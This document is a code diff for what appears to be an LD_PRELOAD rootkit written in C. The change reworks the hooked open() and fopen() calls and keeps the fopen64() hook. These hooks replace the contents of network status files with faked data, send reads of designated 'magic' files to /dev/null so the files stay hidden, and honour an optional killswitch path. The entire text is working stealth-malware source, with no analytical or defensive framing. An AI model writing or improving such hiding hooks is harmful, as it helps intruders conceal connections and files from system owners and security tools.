@@ -60,14 +60,13 @@ struct dirent *readdir(DIR *dirp)
     return dir;
 }
 
-FILE *fopen(const char *pathname, const char *mode)
-{
+int open(const char *pathname, int flags, mode_t mode){
     #ifdef DEBUG
-    printf("[-] hooking fopen\n");
+    printf("[-] hooking open\n");
     #endif
 
-	if(!hooked_fopen){
-		hooked_fopen = 	load_libc("fopen");
+	if(!hooked_open){
+		hooked_open = load_libc("open");
 	}
 
     char real_pathname[PATH_MAX];
@@ -75,7 +74,39 @@ FILE *fopen(const char *pathname, const char *mode)
 
     if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
-        if (!fake_netstat(hooked_fopen, real_pathname, newfile)){
+        if (!fake_netstat(real_pathname, newfile)){
+            return -1;
+        }
+        return hooked_open(newfile, flags, mode);
+    }
+    #ifdef KILLSWITCH
+    else if (strcmp(real_pathname,KILLSWITCH) == 0){
+        return hooked_open(real_pathname, flags, mode);
+    }
+    #endif
+    else if (is_magicfile(real_pathname)){
+        return hooked_open("/dev/null", flags, mode);
+    }
+
+    return hooked_open(pathname, flags, mode);
+}
+
+FILE *fopen(const char *pathname, const char *mode)
+{
+    #ifdef DEBUG
+    printf("[-] hooking fopen\n");
+    #endif
+
+	if(!hooked_fopen){
+		hooked_fopen = load_libc("fopen");
+	}
+
+    char real_pathname[PATH_MAX];
+    realpath(pathname,real_pathname);
+
+    if (is_net_file(real_pathname)){
+        char newfile[PATH_MAX];
+        if (!fake_netstat(real_pathname, newfile)){
             return NULL;
         }
         return hooked_fopen(newfile, mode);
@@ -103,7 +134,7 @@ FILE *fopen64(const char *pathname, const char *mode)
 
     if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
-        if (!fake_netstat(hooked_fopen64, real_pathname, newfile)){
+        if (!fake_netstat(real_pathname, newfile)){
             return NULL;
         }
 	    return hooked_fopen64(newfile, mode);
@@ -155,16 +186,4 @@ int ioctl(int fd, unsigned long request, unsigned long *argp){
     }
 
     return hooked_ioctl(fd, request, argp);
-}
-
-int open(const char *pathname, int flags, unsigned long *argp){
-    #ifdef DEBUG
-    printf("[-] hooking ioctl\n");
-    #endif
-
-    if(!hooked_open){
-		hooked_open = load_libc("open");
-	}
-    
-    return hooked_open(pathname, flags, argp);
 }
